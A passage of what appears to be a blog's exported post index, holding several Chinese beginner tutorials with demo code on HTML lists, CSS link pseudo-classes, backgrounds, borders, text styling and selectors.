class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之列表和超链接伪类</title>
    <url>/2021/07/08/%E3%80%90HTML%E3%80%91CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%97%E8%A1%A8%E5%92%8C%E8%B6%85%E9%93%BE%E6%8E%A5%E4%BC%AA%E7%B1%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css背景超链接伪类和列表使用代码及注释"><a href="#css背景超链接伪类和列表使用代码及注释" class="headerlink" title="css背景超链接伪类和列表使用代码及注释"></a>css背景超链接伪类和列表使用代码及注释</h1><h2 id="demo4"><a href="#demo4" class="headerlink" title="demo4"></a>demo4</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--列表和超链接 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	ul&#123;</span><br><span class="line"><span class="css">    		<span class="comment">/*list-style-type: decimal;*/</span> <span class="comment">/*upper-roman罗马字符 none无项目符号 square正方形 decimal数字*/</span></span></span><br><span class="line">    		/*list-style-image: url(1.jpg);</span><br><span class="line">    		*/</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*以上列表简写*/</span></span></span><br><span class="line"><span class="css">    		<span class="comment">/* list-style: outside decimal; */</span></span></span><br><span class="line">    		list-style: none;</span><br><span class="line">    		&#125;</span><br><span class="line"><span class="css">    		<span class="comment">/*去掉超链接标签的下划线*/</span></span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>: none;&#125;   </span></span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*未访问颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span></span><br><span class="line">    			color: red;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*鼠标放上去的颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line">    			color: navajowhite;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*访问过的颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span></span><br><span class="line">    			color: blue;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*鼠标选中的颜色*/</span></span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span></span><br><span class="line"><span class="css">    			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第二课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第三课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第四课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第二课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第三课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第四课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之背景边框文字文本的学习</title>
    <url>/2021/07/08/%E3%80%90HTML%E3%80%91CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%83%8C%E6%99%AF%E8%BE%B9%E6%A1%86%E6%96%87%E5%AD%97%E6%96%87%E6%9C%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css背景文本框使用代码及注释"><a href="#css背景文本框使用代码及注释" class="headerlink" title="css背景文本框使用代码及注释"></a>css背景文本框使用代码及注释</h1><h2 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--背景颜色 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	body&#123;</span><br><span class="line">    		/*</span><br><span class="line"><span class="css">    		<span class="selector-tag">background-image</span>: <span class="selector-tag">url</span>(1<span class="selector-class">.jpg</span>);  图片背景</span></span><br><span class="line">    		background-repeat: no-repeat;  背景不重复</span><br><span class="line">    		background-size: 200px;        图片像素大小</span><br><span class="line">    		background-attachment: fixed;  图片固定于页面</span><br><span class="line">    		background-position: center top;  图片显示中间顶部</span><br><span class="line">    		*/</span><br><span class="line">    		</span><br><span class="line"><span class="css">    		<span class="comment">/*简写方式*/</span></span></span><br><span class="line">    		/*</span><br><span class="line"><span class="css">    		<span class="selector-tag">background</span>: <span class="selector-tag">url</span>(1<span class="selector-class">.jpg</span>) <span class="selector-tag">no-repeat</span> <span class="selector-tag">fixed</span> <span class="selector-tag">center</span> <span class="selector-tag">top</span>;</span></span><br><span class="line">    		*/</span><br><span class="line">    		font-family: "微软雅黑" arial;</span><br><span class="line">    		font-size: 22px;</span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#808080</span>;</span></span><br><span class="line">    		font-weight: bold;</span><br><span class="line">    		font-variant: small-caps;</span><br><span class="line"></span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="comment">/*边框*/</span></span></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">    		width: 400px;</span><br><span class="line">    		height: 400px;</span><br><span class="line"></span><br><span class="line">    		/*</span><br><span class="line">    		border-width: 10px;</span><br><span class="line">    		border-color: red;  */</span><br><span class="line"><span class="css">    		<span class="comment">/*border-style: double ridge inset outset;   */</span></span></span><br><span class="line">    		</span><br><span class="line">    		border-left: solid;</span><br><span class="line">    		border-right: double;</span><br><span class="line">    		border-top: solid;</span><br><span class="line">    		border-bottom: double;</span><br><span class="line">    		text-align: center;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line">    		line-height: 30px;</span><br><span class="line">    		letter-spacing: 10px;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	p&#123;</span><br><span class="line">    		text-indent: 20px;</span><br><span class="line">    		text-decoration: line-through;</span><br><span class="line"></span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--边框 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		div1</span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">		<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>this is my heart<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之引用样式和选择器的使用</title>
    <url>/2021/07/08/%E3%80%90HTML%E3%80%91CSS%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%95%E7%94%A8%E6%A0%B7%E5%BC%8F%E5%92%8C%E9%80%89%E6%8B%A9%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css使用代码及注释"><a href="#css使用代码及注释" class="headerlink" title="css使用代码及注释"></a>css使用代码及注释</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>框架<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--外部样式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo1"</span>&gt;</span></span><br><span class="line">		demo1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--内联样式--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>这是一个有趣的故事<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--引用样式--&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="style-css"><a href="#style-css" class="headerlink" title="style.css"></a>style.css</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">"css.css"</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.demo1</span>&#123;</span><br><span class="line">    	<span class="attribute">color</span>: blue;</span><br><span class="line">    	<span class="attribute">background</span>: red;</span><br><span class="line">    	<span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">    	<span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">border</span>:  <span class="number">1px</span> solid black;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="css-css"><a href="#css-css" class="headerlink" title="css.css"></a>css.css</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="demo1-php"><a href="#demo1-php" class="headerlink" title="demo1.php"></a>demo1.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--通配符选择器、类选择器、元素选择器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	*&#123;</span><br><span class="line">    		margin: 0px;</span><br><span class="line">    		padding: 0px;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.demo1</span>&#123;</span></span><br><span class="line">    		color: red;</span><br><span class="line">    		background: blue;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	p&#123;</span><br><span class="line">    		color: red;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-id">#demo2</span>&#123;</span></span><br><span class="line">    		color: grey;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo1"</span>&gt;</span></span><br><span class="line">		demo1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo2"</span>&gt;</span></span><br><span class="line">		demo2</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="demo2-php"><a href="#demo2-php" class="headerlink" title="demo2.php"></a>demo2.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--群组选择器、后代选择器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>,<span class="selector-class">.div2</span>&#123;</span></span><br><span class="line">    		width: 400px;</span><br><span class="line">    		height: 400px;    		</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">    		background: red;</span><br><span class="line">    	&#125;</span><br><span class="line"><span class="css">    	<span class="selector-class">.div2</span>&#123;</span></span><br><span class="line">    		background: blue;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.ul1</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">    		color: red;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"ul1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>c</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】列表list使用</title>
    <url>/2021/07/07/%E3%80%90HTML%E3%80%91%E5%88%97%E8%A1%A8list%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="标签使用截图样式"><a href="#标签使用截图样式" class="headerlink" title="标签使用截图样式"></a>标签使用截图样式</h1><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210707161943082.png" alt="image-20210707161943082"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>列表List<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--无序列表 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"circle"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--有序列表 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"I"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第四<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】框架frame的使用</title>
    <url>/2021/07/07/%E3%80%90HTML%E3%80%91%E6%A1%86%E6%9E%B6frame%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
